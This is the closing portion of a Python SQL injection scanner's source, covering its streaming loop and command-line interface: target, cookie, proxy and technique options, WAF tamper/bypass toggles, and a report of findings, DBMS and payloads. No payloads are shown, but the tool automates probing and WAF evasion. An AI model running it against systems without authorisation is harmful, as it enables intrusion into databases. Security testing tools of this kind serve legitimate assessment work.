           "options": {"max_threads": max_threads,
                       "rate_limit": options.get("rate_limit", DEFAULT_RATE_LIMIT),
                       "techniques": [k for k, v in test_flags.items() if v]}}

    while not done.is_set():
        with events_lock:
            pending, events[:] = list(events), []
        for ev in pending:
            yield ev
        done.wait(timeout=0.4)

    with events_lock:
        for ev in events:
            yield ev

    if "error" in holder:
        yield {"type": "error", "message": holder["error"]}
    else:
        yield {"type": "result", "data": holder.get("result", {})}


# ═══════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════
def main() -> int:
    parser = argparse.ArgumentParser(
        description=f"Oxysintx SQL Injection Scanner v{__version__}",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("url", nargs="?", help="Target URL")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("-p", "--param", action="append",
                        help="Parameter to test (name=value)")
    parser.add_argument("--data", help="POST data as query string")
    parser.add_argument("--header", action="append", help="Custom header (Key: Value)")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("--proxy", help="Proxy URL")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    parser.add_argument("--threads", type=int, default=DEFAULT_MAX_THREADS)
    parser.add_argument("--max-requests", type=int, default=DEFAULT_MAX_REQUESTS)
    parser.add_argument("--max-duration", type=float, default=DEFAULT_MAX_DURATION)
    parser.add_argument("--rate-limit", type=float, default=DEFAULT_RATE_LIMIT)
    parser.add_argument("--retries", type=int, default=DEFAULT_RETRIES)
    parser.add_argument("--verify-ssl", action="store_true")
    parser.add_argument("--follow-redirects", action="store_true")
    parser.add_argument("--technique", action="append",
                        choices=["error", "boolean", "time", "union", "stacked"])
    parser.add_argument("--no-tamper", action="store_true",
                        help="Disable WAF tamper expansion")
    parser.add_argument("--max-wordlist", type=int,
                        default=80, help="Max error payloads from wordlist")
    parser.add_argument("--confidence-threshold", type=float,
                        default=DEFAULT_CONFIDENCE_THRESHOLD)
    parser.add_argument("--json", action="store_true")
    parser.add_argument("--pretty-json", action="store_true")
    parser.add_argument("--stream", action="store_true",
                        help="stream progress events (SSE-style lines)")
    parser.add_argument("--wordlists", action="store_true",
                        help="print wordlist metadata and exit")
    parser.add_argument("--wordlists-sync", action="store_true",
                        help="force re-sync all wordlists and exit")
    parser.add_argument("--verbose", action="store_true")
    parser.add_argument("--quiet", action="store_true")
    parser.add_argument("--output", help="Output file path")
    parser.add_argument("--version", action="version", version=__version__)
    args = parser.parse_args()

    if args.wordlists:
        print(json.dumps(ensure_wordlists(force=False), indent=2))
        return 0
    if args.wordlists_sync:
        load_sqli_wordlist(force_download=True)
        print(json.dumps(ensure_wordlists(force=True), indent=2))
        return 0

    if not args.url:
        parser.error("url required")

    level = logging.DEBUG if args.verbose else (
        logging.CRITICAL if args.quiet else logging.INFO)
    logger.setLevel(level)

    headers: Dict[str, str] = {}
    if args.header:
        for h in args.header:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()

    cookies = None
    if args.cookie:
        cookies = {}
        for pair in args.cookie.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                cookies[k.strip()] = v.strip()

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None

    params: Dict[str, str] = {}
    if args.param:
        for p in args.param:
            if "=" in p:
                k, v = p.split("=", 1); params[k] = v
            else:
                params[p] = ""
    if args.data:
        for pair in args.data.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1); params[k] = v

    if args.stream:
        options = {
            "method": args.method, "params": params or None,
            "timeout": args.timeout, "max_threads": args.threads,
            "max_duration": args.max_duration, "rate_limit": args.rate_limit,
            "headers": headers or None, "cookies": cookies,
            "proxies": proxies, "verify_ssl": args.verify_ssl,
        }
        mode = "expert" if (args.technique and len(args.technique) > 2) else "basic"
        for ev in run_streaming(args.url, mode, options):
            t = ev.get("type")
            if t == "start":
                print(f"[start] {ev['url']}  mode={ev['mode']}  "
                      f"techniques={ev['options']['techniques']}")
            elif t == "progress":
                print(f"[{ev['percent']:3d}%] {ev['done']}/{ev['total']}  {ev['label']}")
            elif t == "result":
                if args.json or args.pretty_json:
                    print(json.dumps(ev["data"], indent=2 if args.pretty_json else None))
            elif t == "error":
                print(f"[ERROR] {ev['message']}", file=sys.stderr)
        return 0

    config = ScanConfig(
        timeout=args.timeout, max_threads=args.threads,
        verify_ssl=args.verify_ssl, follow_redirects=args.follow_redirects,
        max_requests=args.max_requests, max_duration=args.max_duration,
        rate_limit=args.rate_limit, retries=args.retries,
        confidence_threshold=args.confidence_threshold,
        enable_tamper=not args.no_tamper,
        max_wordlist_payloads=args.max_wordlist,
    )
    if args.technique:
        config.test_error   = "error"   in args.technique
        config.test_boolean = "boolean" in args.technique
        config.test_time    = "time"    in args.technique
        config.test_union   = "union"   in args.technique
        config.test_stacked = "stacked" in args.technique

    scanner = SQLiScanner(config=config, headers=headers,
                          cookies=cookies, proxies=proxies)
    result = scanner.scan(args.url, args.method, params or None)

    if args.json or args.pretty_json:
        out = json.dumps(result.to_dict(),
                         indent=2 if args.pretty_json else None)
        if args.output:
            with open(args.output, "w") as f: f.write(out)
        if not args.quiet:
            print(out)
        return 0 if result.vulnerable else 1

    lines: List[str] = []
    lines.append("Oxysintx SQL Injection Scanner")
    lines.append("─" * 40)
    lines.append(f"Target       : {result.url}")
    lines.append(f"Method       : {result.method}")
    lines.append(f"Parameters   : {', '.join(result.parameters_tested) or 'none'}")
    lines.append(f"Techniques   : {', '.join(result.techniques_tested)}")
    lines.append(f"Wordlist     : {result.wordlist_size} payload(s)")
    lines.append(f"Tampered     : {result.tampered_payloads} variant(s)")
    if result.waf_detected:
        lines.append(f"WAF          : {result.waf_detected}"
                     + (" (bypass attempted)" if result.waf_bypass_used else ""))
    if result.database_hint:
        db_str = result.database_hint
        if result.db_version:
            db_str += f" v{result.db_version}"
        lines.append(f"DBMS         : {db_str}")
    lines.append("")
    lines.append(f"Status       : {result.status}")
    lines.append(f"Requests     : {result.requests_sent}")
    lines.append(f"Duration     : {result.duration:.2f}s")
    lines.append("")
    if result.findings:
        lines.append("Findings")
        lines.append("─" * 40)
        for f in result.findings:
            label = ConfidenceEngine.classify(f.confidence)
            lines.append(f"[{label.upper()}] {f.parameter} ({f.parameter_in})")
            lines.append(f"  Technique   : {f.technique}")
            lines.append(f"  Confidence  : {f.confidence:.2f}")
            lines.append(f"  DBMS        : {f.database_type or 'unknown'}")
            if f.db_version:
                lines.append(f"  Version     : {f.db_version}")
            lines.append(f"  Status      : {f.status}")
            if f.payload:
                lines.append(f"  Payload     : {sanitize_payload_for_log(f.payload, 80)}")
            lines.append("")
    else:
        lines.append("No vulnerabilities detected.")
    out = "\n".join(lines)
    if args.output:
        with open(args.output, "w") as f: f.write(out)
    if not args.quiet:
        print(out)
    return 0 if result.vulnerable else 1


if __name__ == "__main__":
    sys.exit(main())